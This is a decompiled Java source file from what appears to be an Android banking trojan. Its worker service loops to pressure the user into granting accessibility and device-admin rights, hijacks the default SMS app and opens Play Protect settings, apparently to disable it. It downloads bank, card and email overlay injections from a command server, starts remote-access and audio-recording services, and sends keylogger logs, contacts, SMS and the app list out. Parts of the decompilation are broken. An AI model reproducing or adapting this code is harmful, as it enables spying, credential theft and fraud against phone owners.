/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.app.IntentService
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  android.net.Uri
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.provider.Telephony
 *  android.provider.Telephony$Sms
 *  android.util.Base64
 */
package com.example.mmm.Service;

import android.app.IntentService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Telephony;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Activity.actPermissions;
import com.example.mmm.Activity.actToaskAccessibility;
import com.example.mmm.Activity.activity_change_sms_manager_sdk_Q;
import com.example.mmm.Admin.ActivityAdmin;
import com.example.mmm.Service.srvAccessibility;
import com.example.mmm.Service.srvLockDevice;
import com.example.mmm.Service.srvRAT;
import com.example.mmm.Service.srvRecordAudio;
import com.example.mmm.Utils.utils;
import com.example.mmm.Utils.utils2;
import com.example.mmm.constants;

public class srvWhileWorker
extends IntentService {
    utils ethnic$ = new utils();
    constants research$ = new constants();

    public srvWhileWorker() {
        super("");
    }

    private String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    /*
     * Unable to fully structure code
     */
    protected void onHandleIntent(Intent var1_1) {
        var13_2 = new utils2();
        var1_1 = new StringBuilder();
        var1_1.append(srvWhileWorker.class.getSimpleName());
        var1_1.append("  ");
        var14_3 = var1_1.toString();
        var15_4 = this.ethnic$.SettingsRead((Context)this, "QQ");
        var5_5 = 2000;
        var2_6 = 0;
        var4_7 = 0;
        var3_8 = 0;
        var9_9 = 0;
        block0 : do {
            if (!utils.isMyServiceRunning((Context)this, srvAccessibility.class) && utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                this.startService(new Intent((Context)this, srvAccessibility.class));
            }
            utils.chalkTile(var5_5);
            var6_10 = Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "AK"));
            var10_13 = var6_10 + 2;
            this.ethnic$.SettingsWrite((Context)this, "AK", String.valueOf(var10_13));
            var1_1 = this.ethnic$;
            var16_16 = new StringBuilder();
            var16_16.append("Tick: ");
            var16_16.append(var10_13);
            var1_1.Log(var14_3, var16_16.toString());
            if (!utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class) && (var12_15 = utils.getScreenBoolean((Context)this))) {
                var5_5 = var4_7 + 1;
                var6_10 = var3_8 + 1;
                var3_8 = var5_5;
                var4_7 = var3_8;
                if (Build.VERSION.SDK_INT < 29) {
                    var4_7 = var3_8;
                    if (this.research$.regional$) {
                        var4_7 = var3_8;
                        this.startActivity(new Intent((Context)this, actToaskAccessibility.class).addFlags(268435456).addFlags(536870912).addFlags(1073741824));
                    } else {
                        var4_7 = var3_8;
                        this.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS").addFlags(268435456).addFlags(536870912).addFlags(1073741824));
                    }
                }
                var7_11 = 2000;
                var5_5 = var2_6;
                var4_7 = var3_8;
                var3_8 = var6_10;
                var2_6 = var7_11;
            } else {
                var5_5 = var2_6;
                ++var5_5;
                var2_6 = 20000;
            }
            if (utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class) && "xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10 && !this.ethnic$.SettingsRead((Context)this, "XB").equals("1")) {
                this.ethnic$._tattoo((Context)this, this.ethnic$.getLabelApplication((Context)this), this.ethnic$._painful(), "main");
            }
            var7_11 = var5_5;
            var6_10 = var4_7;
            var5_5 = var3_8;
            var4_7 = var2_6;
            var3_8 = var7_11;
            if (utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class) && Build.VERSION.SDK_INT >= 29 && utils.getMiuiVersion() < 10) {
                this.ethnic$._chapel((Context)this);
            }
            var1_1 = this.ethnic$.SettingsRead((Context)this, "XS");
            if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10 && utils._prayer((Context)this) && utils.getScreenBoolean((Context)this) && this.ethnic$.SettingsRead((Context)this, "XB").equals("1") && !var1_1.equals("1") && utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                var13_2._fires((Context)this);
                this.ethnic$.Log(var14_3, "Open Activity AutoStartManagement");
            }
            if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10 && utils._prayer((Context)this) && utils.getScreenBoolean((Context)this) && this.ethnic$.SettingsRead((Context)this, "XB").equals("1") && var1_1.equals("1") && !this.ethnic$.SettingsRead((Context)this, "XH").equals("1") && utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                var13_2._tulsa((Context)this);
                this.ethnic$.Log(var14_3, "Open Activity isXiaomiHiddenappsconfigactivity");
            }
            if (utils._exercise((Context)this) && !utils.isMyServiceRunning((Context)this, srvLockDevice.class) && this.ethnic$.SettingsRead((Context)this, "AZ").equals("1")) {
                this.startService(new Intent((Context)this, srvLockDevice.class));
            }
            if (utils.hasPermission((Context)this, this.research$.pentium$[2]).equals("1")) {
                if (this.ethnic$.SettingsRead((Context)this, "WR").equals("1") && !utils.isMyServiceRunning((Context)this, srvRecordAudio.class) && !this.ethnic$.SettingsRead((Context)this, "SS").equals("start")) {
                    this.startService(new Intent((Context)this, srvRecordAudio.class).putExtra("tick", "-1").putExtra("name", "record_audio"));
                }
                if ((var1_1 = this.ethnic$.SettingsRead((Context)this, "FF")).contains("###")) {
                    this.ethnic$._pasta((Context)this, (String)var1_1);
                }
            }
            if (!this.ethnic$.SettingsRead((Context)this, "QO").equals("1")) ** GOTO lbl188
            this.ethnic$.Log(var14_3, "Start Downloading Injections...");
            var1_1 = this.ethnic$.SettingsRead((Context)this, "QU").split(":");
            var11_14 = 0;
            var2_6 = 0;
            do {
                block46 : {
                    block45 : {
                        if (var11_14 >= ((Object)var1_1).length) break block45;
                        var16_16 = this.ethnic$;
                        var17_17 = new StringBuilder();
                        var17_17.append("Name Inject: ");
                        var17_17.append((String)var1_1[var11_14]);
                        var16_16.Log(var14_3, var17_17.toString());
                        var7_11 = var2_6;
                        if (var1_1[var11_14].isEmpty()) break block46;
                        var12_15 = var1_1[var11_14].equals("device_null#");
                        var7_11 = var2_6;
                        if (var12_15) break block46;
                        var8_12 = var2_6;
                        var7_11 = var2_6;
                        if (!this.ethnic$.SettingsRead((Context)this, (String)var1_1[var11_14]).isEmpty()) break block46;
                        var8_12 = var2_6;
                        var16_16 = this.ethnic$._plates((Context)this, (String)var1_1[var11_14], "q=d_attacker&ws=");
                        var8_12 = var2_6;
                        if (var16_16.length() > 10) {
                            var8_12 = var2_6;
                            this.ethnic$.SettingsWrite((Context)this, (String)var1_1[var11_14], (String)var16_16);
                            var8_12 = var2_6;
                            var17_17 = this.ethnic$;
                            var8_12 = var2_6;
                            var18_18 = new StringBuilder();
                            var8_12 = var2_6;
                            var18_18.append("Downloading Injection:  ");
                            var8_12 = var2_6;
                            var18_18.append((String)var1_1[var11_14]);
                            var8_12 = var2_6;
                            var18_18.append("   size: ");
                            var8_12 = var2_6;
                            var18_18.append(var16_16.length());
                            var8_12 = var2_6;
                            var17_17.Log(var14_3, var18_18.toString());
                        } else {
                            var8_12 = var2_6;
                            var17_17 = this.ethnic$;
                            var8_12 = var2_6;
                            var18_18 = new StringBuilder();
                            var8_12 = var2_6;
                            var18_18.append("Downloading Injection Error:  ");
                            var8_12 = var2_6;
                            var18_18.append((String)var1_1[var11_14]);
                            var8_12 = var2_6;
                            var18_18.append("   size: ");
                            var8_12 = var2_6;
                            var18_18.append(var16_16.length());
                            var8_12 = var2_6++;
                            var17_17.Log(var14_3, var18_18.toString());
                        }
                        var8_12 = var2_6;
                        var16_16 = this.ethnic$._tests((Context)this, (String)var1_1[var11_14], "q=d_attacker_two&ws=");
                        var8_12 = var2_6;
                        var7_11 = var2_6;
                        if (var16_16.length() <= 10) break block46;
                        var8_12 = var2_6;
                        var17_17 = this.ethnic$;
                        var8_12 = var2_6;
                        var18_18 = new StringBuilder();
                        var8_12 = var2_6;
                        var18_18.append("icon_");
                        var8_12 = var2_6;
                        var18_18.append((String)var1_1[var11_14]);
                        var8_12 = var2_6;
                        var17_17.SettingsWrite((Context)this, var18_18.toString(), (String)var16_16);
                        var8_12 = var2_6;
                        var17_17 = this.ethnic$;
                        var8_12 = var2_6;
                        var18_18 = new StringBuilder();
                        var8_12 = var2_6;
                        var18_18.append("Downloading Icon:  ");
                        var8_12 = var2_6;
                        var18_18.append((String)var1_1[var11_14]);
                        var8_12 = var2_6;
                        var18_18.append("   size: ");
                        var8_12 = var2_6;
                        var18_18.append(var16_16.length());
                        var8_12 = var2_6;
                        var17_17.Log(var14_3, var18_18.toString());
                        var7_11 = var2_6;
                        break block46;
                    }
                    this.ethnic$.SettingsWrite((Context)this, "QO", "");
                    this.ethnic$.Log(var14_3, "Downloading All Injections! =)");
                    System.gc();
lbl188: // 2 sources:
                    if (!(var1_1 = this.ethnic$.SettingsRead((Context)this, "AA")).isEmpty()) {
                        var1_1 = var1_1.split(":");
                        for (var2_6 = 0; var2_6 < ((Object)var1_1).length; ++var2_6) {
                            if (var1_1[var2_6].isEmpty()) continue;
                            var16_16 = this.ethnic$;
                            var17_17 = new StringBuilder();
                            var17_17.append("Send Data Injection to Server: ");
                            var17_17.append((String)var1_1[var2_6]);
                            var16_16.Log(var14_3, var17_17.toString());
                            var16_16 = this.ethnic$.SettingsRead((Context)this, (String)var1_1[var2_6]);
                            var17_17 = this.ethnic$;
                            var18_18 = new StringBuilder();
                            var18_18.append("RESPENCE ");
                            var18_18.append((String)var16_16);
                            var17_17.Log(var14_3, var18_18.toString());
                            var17_17 = this.ethnic$;
                            var18_18 = var1_1[var2_6];
                            var19_19 = "q=saved_data_attacker&ws=";
                            var7_11 = var2_6;
                            if (!var17_17._decrease((Context)this, (String)var18_18, (String)var16_16, var15_4, var19_19).equals("ok")) continue;
                            var16_16 = this.ethnic$;
                            var17_17 = new StringBuilder();
                            var17_17.append("RESPONCE (ok) ");
                            var17_17.append((String)var1_1[var7_11]);
                            var16_16.Log(var14_3, var17_17.toString());
                            var16_16 = this.ethnic$;
                            var17_17 = "AA";
                            var18_18 = new StringBuilder();
                            var18_18.append((String)var1_1[var7_11]);
                            var18_18.append(":");
                            var16_16._founded((Context)this, (String)var17_17, var18_18.toString());
                        }
                    }
                    this.ethnic$._compiled((Context)this, var15_4);
                    var1_1 = this.ethnic$;
                    var16_16 = var1_1.SettingsRead((Context)this, "AM");
                    if (!var16_16.isEmpty() && var1_1.sendKeyloggerLogs((Context)this, (String)var16_16, var15_4, "q=saved_accessibility_events&ws=").equals("ok")) {
                        var1_1.SettingsWrite((Context)this, "AM", "");
                    }
                    if (!(var16_16 = (var1_1 = this.ethnic$).SettingsRead((Context)this, "SX")).isEmpty() && var1_1._servers((Context)this, (String)var16_16, var15_4, "q=saved_contacts&ws=").equals("ok")) {
                        var1_1.SettingsWrite((Context)this, "SX", "");
                    }
                    if (!(var16_16 = var1_1.SettingsRead((Context)this, "SV")).isEmpty() && var1_1._scott((Context)this, (String)var16_16, var15_4, "q=saved_all_sms&ws=").equals("ok")) {
                        var1_1.SettingsWrite((Context)this, "SV", "");
                    }
                    if (!(var16_16 = var1_1.SettingsRead((Context)this, "SC")).isEmpty() && var1_1.sendSavedSms((Context)this, (String)var16_16, var15_4, "q=saved_applications&ws=").equals("ok")) {
                        var1_1.SettingsWrite((Context)this, "SC", "");
                    }
                    if (utils.getScreenBoolean((Context)this) && Build.VERSION.SDK_INT >= 19) {
                        if (!(this.ethnic$.SettingsRead((Context)this, "AF").equals("1") || this.ethnic$.SettingsRead((Context)this, "SN").equals("1") && Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "SM")) >= 10)) {
                            if (Telephony.Sms.getDefaultSmsPackage((Context)this).equals(this.getPackageName()) && Build.VERSION.SDK_INT < 29) {
                                this.ethnic$.SettingsWrite((Context)this, "SQ", "1");
                                utils.swapSmsManager((Context)this, this.ethnic$.SettingsRead((Context)this, "AD"));
                            }
                        } else if (!Telephony.Sms.getDefaultSmsPackage((Context)this).equals(this.getPackageName())) {
                            var2_6 = Build.VERSION.SDK_INT;
                            if (var2_6 >= 29) {
                                this.ethnic$.SettingsWrite((Context)this, "SQ", "1");
                                this.startActivity(new Intent((Context)this, Class.forName(activity_change_sms_manager_sdk_Q.class.getName())).addFlags(268435456));
                            } else {
                                this.ethnic$.SettingsWrite((Context)this, "SQ", "1");
                                utils.swapSmsManager((Context)this, this.getPackageName());
                            }
                        }
                        if (Telephony.Sms.getDefaultSmsPackage((Context)this).equals(this.getPackageName()) && this.ethnic$.SettingsRead((Context)this, "SN").equals("1")) {
                            this.ethnic$.SettingsWrite((Context)this, "SN", "");
                        }
                    }
                    if (this.ethnic$.SettingsRead((Context)this, "AX").equals("1")) {
                        utils._pensions((Context)this);
                    }
                    if (utils.getScreenBoolean((Context)this) && !(var1_1 = this.ethnic$.SettingsRead((Context)this, "QR")).isEmpty()) {
                        this.ethnic$.SettingsWrite((Context)this, "SQ", "1");
                        var16_16 = new Intent("android.intent.action.DELETE");
                        var16_16.setData(Uri.parse((String)"package:".concat(String.valueOf(var1_1))));
                        this.startActivity((Intent)var16_16);
                    }
                    if (!this.ethnic$.SettingsRead((Context)this, "QU").isEmpty()) {
                        var2_6 = Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "AV"));
                        if (var10_13 > var2_6 && var2_6 != -1 && var2_6 != -2 && this.ethnic$._atlantic((Context)this, "run_injects_banks", var15_4, "q=pause_attacker&ws=").equals("on_inject_banks")) {
                            this.ethnic$.SettingsWrite((Context)this, "AV", "-2");
                        }
                        if (var10_13 > (var2_6 = Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "AB"))) && var2_6 != -1 && var2_6 != -2 && this.ethnic$._atlantic((Context)this, "run_injects_cards", var15_4, "q=pause_attacker&ws=").equals("on_inject_cards")) {
                            this.ethnic$.SettingsWrite((Context)this, "AB", "-2");
                        }
                        if (var10_13 > (var2_6 = Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "AN"))) && var2_6 != -1 && var2_6 != -2 && this.ethnic$._atlantic((Context)this, "run_injects_emails", var15_4, "q=pause_attacker&ws=").equals("on_inject_emails")) {
                            this.ethnic$.SettingsWrite((Context)this, "AN", "-2");
                        }
                    }
                    if (!utils.isMyServiceRunning((Context)this, srvRAT.class) && this.ethnic$.SettingsRead((Context)this, "RQ").equals("connect")) {
                        this.startService(new Intent((Context)this, srvRAT.class));
                    }
                    if ((var2_6 = Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "SI"))) > 0 && var10_13 > var2_6 && utils.getScreenBoolean((Context)this) && !this.ethnic$.hasPermissionAllTrue((Context)this) && this.ethnic$.SettingsRead((Context)this, "SN").isEmpty()) {
                        this.startActivity(new Intent((Context)this, actPermissions.class).addFlags(268435456));
                    }
                    if ((var2_6 = Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "SU"))) > 0 && var10_13 > var2_6 && !utils._exercise((Context)this) && utils.getScreenBoolean((Context)this) && utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                        if (utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                            this.ethnic$.SettingsWrite((Context)this, "SQ", "1");
                            this.ethnic$.Log(var14_3, "autoClick=1 ADMIN DEVICE");
                        }
                        var1_1 = new Intent((Context)this, ActivityAdmin.class);
                        var1_1.putExtra("admin", "1");
                        var1_1.addFlags(268435456);
                        var1_1.addFlags(536870912);
                        this.startActivity((Intent)var1_1);
                    }
                    var7_11 = var9_9 + 1;
                    if (utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class) && this.research$.fault$ && utils.getScreenBoolean((Context)this) && this.ethnic$.SettingsRead((Context)this, "SR").equals("1") && var10_13 > Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "SY"))) {
                        if (Build.VERSION.SDK_INT >= 25) {
                            this.ethnic$.SettingsWrite((Context)this, "ST", "1");
                            var1_1 = new Intent("com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                            var1_1.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                            var1_1.addFlags(268435456);
                            var1_1.addFlags(8388608);
                            this.startActivity((Intent)var1_1);
                        } else {
                            this.ethnic$.SettingsWrite((Context)this, "ST", "1");
                            var1_1 = new Intent("com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                            var1_1.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                            var1_1.addFlags(268435456);
                            var1_1.addFlags(8388608);
                            this.startActivity((Intent)var1_1);
                        }
                    }
                    var8_12 = var5_5;
                    var2_6 = var3_8;
                    var5_5 = var4_7;
                    var4_7 = var6_10;
                    var3_8 = var8_12;
                    var9_9 = var7_11;
                    continue block0;
                }
                ++var11_14;
                var2_6 = var7_11;
            } while (true);
            break;
        } while (true);
    }
}

